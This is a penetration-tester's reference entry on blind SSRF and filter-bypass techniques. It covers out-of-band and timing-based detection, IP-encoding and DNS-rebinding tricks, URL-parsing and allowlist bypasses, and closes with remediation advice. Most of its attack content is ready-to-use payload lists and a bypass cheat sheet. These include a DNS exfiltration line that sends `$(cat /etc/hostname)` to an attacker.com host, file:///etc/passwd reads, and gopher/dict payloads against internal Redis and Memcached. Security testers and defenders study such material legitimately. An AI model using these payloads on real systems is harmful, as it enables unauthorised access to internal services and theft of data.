# Blind SSRF & Filter Bypass Techniques

**Category:** SSRF  
**Severity:** Medium–High  
**CWE:** CWE-918  
**Last Updated:** 2026-02-03  
**Author:** Ghost 👻

---

## Blind SSRF

### What Is It?
Blind SSRF occurs when the application makes the server-side request but doesn't return the response to the attacker. You know it works but can't see the output directly.

### Detection Methods

**Out-of-Band (OOB) Detection:**
```
?url=http://BURP-COLLABORATOR-ID.oastify.com
?url=http://INTERACTSH-ID.interact.sh
?url=http://YOUR-SERVER.com/ssrf-callback
```
If you receive a DNS lookup or HTTP request → SSRF confirmed.

**Timing-Based Detection:**
```
# Open port (fast response)
?url=http://127.0.0.1:80       → 200ms response

# Closed port (connection refused, also fast)
?url=http://127.0.0.1:81       → 50ms response

# Filtered port (timeout, slow)
?url=http://10.0.0.1:22        → 10000ms response

# Compare response times to map internal network
```

**Error-Based Detection:**
```
# Different error messages reveal port status
?url=http://127.0.0.1:80   → "Invalid response format"
?url=http://127.0.0.1:9999 → "Connection refused"
?url=http://10.0.0.1:22    → "Connection timed out"
```

### Blind SSRF Exploitation
Even without response content, blind SSRF can:
1. **Port scan** internal network via timing
2. **Trigger actions** on internal services (hitting admin endpoints)
3. **Exfiltrate via DNS**: `?url=http://$(cat /etc/hostname).attacker.com`
4. **Interact with non-HTTP services** via gopher:// or dict://

---

## Filter Bypass Techniques

### IP Address Encoding Tricks

| Format | Example | Bypasses |
|--------|---------|----------|
| Decimal | `http://2130706433` (= 127.0.0.1) | Regex matching dots |
| Octal | `http://0177.0.0.01` | Simple IP validation |
| Hex | `http://0x7f000001` | Pattern matching |
| Mixed | `http://0177.0.0.0x01` | Multiple formats |
| IPv6 | `http://[::1]` | IPv4-only filters |
| IPv6 mapped | `http://[::ffff:127.0.0.1]` | IPv4 blocklists |
| Shortened | `http://127.1` | Full IP validation |
| Zero-padded | `http://127.000.000.001` | Exact string match |

### DNS-Based Bypasses

**Attacker-controlled DNS:**
```
# Register domain that resolves to 127.0.0.1
http://localhost.attacker.com     → 127.0.0.1
http://127.0.0.1.nip.io          → 127.0.0.1
http://spoofed.burpcollaborator.net → 127.0.0.1 (with DNS rebinding)
```

**DNS Rebinding:**
```
1. Attacker domain resolves to legitimate IP (passes validation)
2. DNS TTL = 0 (or very low)
3. Server validates hostname → resolves to safe IP ✓
4. Server makes actual request → DNS re-resolves to 127.0.0.1
5. Request hits internal service
```

**Tool:** [HTTPRebind](https://github.com/daeken/httprebind) — automates DNS rebinding

### URL Parsing Tricks

**Open redirect chaining:**
```
?url=https://allowed-domain.com/redirect?url=http://127.0.0.1
```
Server validates `allowed-domain.com`, but the redirect sends the request to localhost.

**URL fragment/credential confusion:**
```
http://allowed-domain.com@127.0.0.1    → Sends to 127.0.0.1 (userinfo)
http://127.0.0.1#@allowed-domain.com   → Parser confusion
http://127.0.0.1%23@allowed-domain.com → URL-encoded #
```

**Double URL encoding:**
```
http://127.0.0.1 → http://127%2e0%2e0%2e1 → http://127%252e0%252e0%252e1
```

**Newline injection (LF/CRLF):**
```
?url=http://allowed.com%0a%0dHost:%20127.0.0.1
```
Used in Search.gov SSRF (HackerOne #514224) — LF character (`%0a`) bypassed URL validation.

### Protocol Bypass

```
# When http:// is blocked
?url=//127.0.0.1    → Protocol-relative URL (inherits page protocol)

# When specific protocols checked
?url=HTTP://127.0.0.1    → Case variation
?url=hTtP://127.0.0.1    → Mixed case

# Alternative schemes if supported
?url=gopher://127.0.0.1:6379/_INFO
?url=dict://127.0.0.1:6379/INFO
?url=file:///etc/passwd
?url=ftp://127.0.0.1
```

### Allowlist Bypass

```
# Subdomain matching bypass
?url=http://allowed-domain.com.attacker.com   → Resolves to attacker's IP

# Regex bypass (e.g., checking if URL contains "allowed.com")
?url=http://attacker.com/allowed.com

# Whitelisted domain with open redirect
?url=https://accounts.google.com/signin/oauth/redirect?url=http://127.0.0.1
```

---

## Bypass Cheat Sheet (Quick Reference)

```
# Basic
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]

# Encoding
http://2130706433
http://0x7f000001
http://0177.0.0.01
http://127.1

# DNS
http://127.0.0.1.nip.io
http://localtest.me
http://customer-controlled.attacker.com

# Redirects
http://bit.ly/[shortlink-to-internal]
http://allowed.com/redirect?to=http://127.0.0.1

# URL parsing
http://allowed.com@127.0.0.1
http://127.0.0.1%2523@allowed.com

# Schemes
gopher://127.0.0.1:6379/_INFO
file:///etc/passwd
dict://127.0.0.1:11211/stats
```

---

## Remediation (Bypass-Resistant)

1. **Resolve-then-check**: Resolve DNS first, validate the resulting IP, then make the request to that IP
2. **Double resolution**: Check IP before AND after redirect following
3. **Block all private ranges** at the network/firewall level (not just application)
4. **Disable redirect following** in HTTP client
5. **Allowlist approach**: Only permit requests to known domains, not blocklist
6. **Strip non-HTTP schemes** before any processing
7. **Use a dedicated SSRF proxy**: All outbound requests go through a locked-down proxy that enforces rules at network level

---

## Tools

- **Burp Suite Collaborator** — OOB detection for blind SSRF
- **Interactsh** (open source) — Same as Collaborator but free
- **SSRFTest** — Automated SSRF testing tool
- **HTTPRebind** — DNS rebinding automation
- **Gopherus** — Generates gopher:// payloads for Redis, MySQL, FastCGI, etc.

---

## Real-World References

- HackerOne #514224 (Search.gov) — LF character bypass, $150 bounty
- HackerOne #341876 — Blind SSRF to enumerate Google Cloud services
- @Rhynorater X thread — Regex validation bypasses (comprehensive collection)

---

## Web3 Notes

- Many Web3 backends use **Node.js** — `got`, `axios`, `node-fetch` all follow redirects by default
- **IPFS gateways** as open redirect equivalents — point to IPFS content that returns 302 to internal IP
- **Smart contract storage** as payload delivery — store malicious URL on-chain, backend fetches it later (second-order SSRF)
- **GraphQL introspection** on internal endpoints reachable via blind SSRF → reveals entire API schema
